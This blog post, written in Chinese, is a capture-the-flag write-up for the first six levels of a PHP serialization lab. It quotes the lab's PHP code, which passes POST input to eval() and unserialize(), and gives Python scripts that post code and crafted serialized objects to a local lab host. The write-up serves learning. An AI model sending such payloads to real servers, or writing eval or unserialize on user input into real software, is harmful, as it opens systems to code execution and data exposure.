---
title: "phpserialize-labs第1到6关"
description: "phpserialize-labs第一到六关解析"
pubDate: 2026-11-26T20:54
tags: [php反序列化, 序列化]
---

# phpserialize-labs第一到六关
---
## le1
前端提示如下:
```php
class FLAG{
    public $flag_string = "HelloCTF{？？？？}";

    function __construct(){
        echo $this->flag_string;
    }
}

$code = $_POST['code'];

eval($code);
```
定义了一个FLAG类,其中包含一个变量和一个函数,在实例化(`new FLAG()`)这个类的时候,就会自动运行`__construct()`这个函数,并且将属性打印出来  
变量code从post请求中的`code`参数中接受内容,并且在下一步`eval`中,把接收到的内容直接执行出来  
所以我们可以构造如下代码
```python
import requests

url = "http://php.test/Level1/index.php/"

data = {
    "code":"new FLAG();"
}
res = requests.post(url,data =data)

print(res.text)

# HelloCTF{OK_Now_y0u_c4n_se3_me}
```
得到flag
---

## le2
前端提示如下:
```php
error_reporting(0);                    # 关闭了所有 PHP 的错误报告机制
$flag_string = "HelloCTF{？？？？}";    # 定义全局变量
 
class FLAG{
        public $free_flag = "???";

        function get_free_flag(){
            echo $this->free_flag;
        }
    }                                   # 定义类
$target = new FLAG();                   # 实例化类并赋值给target

$code = $_POST['code'];                 # 接收post中的code参数

if(isset($code)){                       # 是否存在code这个变量
       eval($code);                     # 将这个变量的值作为语句直接运行
       $target->get_free_flag();        # 访问类中的get_free_flag()函数
}
else{
    highlight_file('source');
}
```
这里我们需要将全局变量flag_string的值传给属性free_flag,就会自动弹出来flag了  
(其实还有个简单办法,直接echo这个全局变量就行了)

```python
import requests

url = "http://php.test/Level2/index.php/"

data = {
    "code":"$target->free_flag = $flag_string;"
}

res = requests.post(url,data =data)

print(res.text)

# Now Flag is HelloCTF{I_giv3_t0_y0u&y0u_giv3_t0_me}
```
---
## le3
前端提示如下:
```php
    class FLAG{                                     # 定义类
        public $public_flag = "HelloCTF{?";         # 定义三个 访问修饰符 不同的属性
        protected $protected_flag = "?";
        private $private_flag = "?}";

        function get_protected_flag(){
            return $this->protected_flag;
        }

        function get_private_flag(){
            return $this->private_flag;
        }
    }

    class SubFLAG extends FLAG{                     # 子类subflag继承父类flag的属性和方法(注意,private属性不继承)
        function show_protected_flag(){
            return $this->protected_flag;
        }

        function show_private_flag(){
            return $this->private_flag;
        }
    }

    $target = new FLAG();
    $sub_target = new SubFLAG();

    $code = $_POST['code'];

    if(isset($code)){
        eval($code);
    } else {
        highlight_file(__FILE__);
        echo "Trying to get FLAG...<br>";
        echo "Public Flag: ".$target->public_flag."<br>";
        echo "Protected Flag:".$target->protected_flag ."<br>";
        echo "Private Flag:".$target->private_flag ."<br>";
    }
```
这道题有一个继承,`class SubFLAG extends FLAG`,子类继承了父类除 private 外的所有属性和全部方法。
这道题从父类就能把所有内容掏出来,构造payload如下:

```python
import requests

url = "http://php.test/Level3/index.php/"

data = {
    "code":"echo $target->public_flag.$target->get_protected_flag().$target->get_private_flag();"
}
res = requests.post(url,data =data)

print(res.text)

# HelloCTF{se3_me_4nd_g3t_mmmme}
```
---

## le4
前端提示如下:
```php
class FLAG3{
    private $flag3_object_array = array("？","？");
}

class FLAG{
    private $flag1_string = "？";
    private $flag2_number = '?';
    private $flag3_object;

    function __construct() {
        $this->flag3_object = new FLAG3();      # FLAG实例化时被触发,并将FLAG3实例化且赋值给flag3_object
    }
}

$flag_is_here = new FLAG();                     # 实例化FLAG并赋值给flag_is_here

$code = $_POST['code'];

if(isset($code)){
    eval($code);
} else {
    highlight_file(__FILE__);
}
```
全是私有属性,尝试序列化`$flag_is_here`,现在意识到前面的题也能这么做
```python
import requests

url = "http://php.test/Level4/index.php/"

data = {
    "code":"echo serialize($flag_is_here);"
}
res = requests.post(url,data =data)

print(res.text)

# O:4:"FLAG":3:{s:18:"FLAGflag1_string";s:8:"ser4l1ze";s:18:"FLAGflag2_number";i:2;s:18:"FLAGflag3_object";O:5:"FLAG3":1:{s:25:"FLAG3flag3_object_array";a:2:{i:0;s:3:"se3";i:1;s:2:"me";}}}

# 私有值全露出来了：ser4l1ze / 2 / se3 / me
```
---
## le5
前端提示如下:
```php
<?php

$your_object = unserialize($_POST['o']);
$your_array = unserialize($_POST['a']);
$your_string = unserialize($_POST['s']);
$your_number = unserialize($_POST['i']);
$your_boolean = unserialize($_POST['b']);
$your_NULL = unserialize($_POST['n']);

if(
    $your_boolean && 
    $your_NULL == null &&
    $your_string == "IWANT" &&
    $your_number == 1 &&
    $your_object->a_value == "FLAG" &&
    $your_array['a'] == "Plz" && $your_array['b'] == "Give_M3"
){
    echo $flag;
}
else{
    echo "You really know how to serialize?";
}

// You really know how to serialize?
```
这道题的题目前面给了常见变量的序列化形式,如下:
```php
class a_class{
    public $a_value = "HelloCTF";
}
$a_object = new a_class();
$a_array = array(a=>"Hello",b=>"CTF");
$a_string = "HelloCTF";
$a_number = 678470;
$a_boolean = true;
$a_null = null;

// See How to serialize:
// a_object: O:7:"a_class":1:{s:7:"a_value";s:8:"HelloCTF";}
// a_array: a:2:{s:1:"a";s:5:"Hello";s:1:"b";s:3:"CTF";}
// a_string: s:8:"HelloCTF";
// a_number: i:678470;
// a_boolean: b:1;
// a_null: N;
// Now your turn!!
```
让你构造序列化后的内容,然后在这个题目中会自动反序列化并跟他给的值作对比,如果都对了,就会输出flag
```python
import requests

url = "http://php.test/Level5/index.php/"

data = {
    "o":'O:7:"a_class":1:{s:7:"a_value";s:4:"FLAG";}',
    "s":'s:5:"IWANT";',
    "a":'a:2:{s:1:"a";s:3:"Plz";s:1:"b";s:7:"Give_M3";}',
    "i":'i:1;',
    "b":'b:1;',
    "n":'N;'
}
res = requests.post(url,data =data)

print(res.text)

# HelloCTF{Gre4t,y0u_can_als0_ser4l1ze2se_1n_y0ur_m1nd!}
```
---
## le6
前端提示如下:
```php
<?php

$protected_key = unserialize($_POST['protected_key']);
$private_key = unserialize($_POST['private_key']);

if(isset($protected_key)&&isset($private_key)){
    if($protected_key->get_key() == "protected_key" && $private_key->get_key() == "private_key"){
        echo $flag;
    } else {
        echo "We Call it %00_Contr0l_Characters_NULL!";
    }
} else {
    highlight_file(__FILE__);
}
```
题干前有一些提示,如下:
```php
class protectedKEY{
    protected $protected_key;

    function get_key(){
        return $this->protected_key;
    }
}

class privateKEY{
    private $private_key;

    function get_key(){
        return $this->private_key;
    }

}
// See Carfully~
// protected's serialize: O%3A12%3A%22protectedKEY%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00protected_key%22%3BN%3B%7D
// private's serialize: O%3A10%3A%22privateKEY%22%3A1%3A%7Bs%3A23%3A%22%00privateKEY%00private_key%22%3BN%3B%7D
```
这道题是让构造保护和私有的属性的序列化内容,然后由题目反序列化之后与给定内容作对比
```python
import requests

url = "http://php.test/Level6/index.php/"

data = {
    "protected_key":"O:12:\"protectedKEY\":1:{s:16:\"\x00*\x00protected_key\";s:13:\"protected_key\";}",
    "private_key":"O:10:\"privateKEY\":1:{s:23:\"\x00privateKEY\x00private_key\";s:11:\"private_key\";}"
}
res = requests.post(url,data =data)

print(res.text)

# HelloCTF{P3rm1ssi0n_Modif_1s_1mp0rtant}
```
老实构造序列化后的内容,很枯燥吧?  
可以单开一个php文件,在里面构造类,属性等等,然后把需要的东西填好,就像这样
```php
<?php
class privateKEY {
    private $private_key = "private_key";
}
$obj = new privateKEY();
echo urlencode(serialize($obj));
?>
```
然后就好了,构造的内容跟上面"private_key"的~~一模一样!!~~(呃呃,不太一样,这是url编码之后的结果)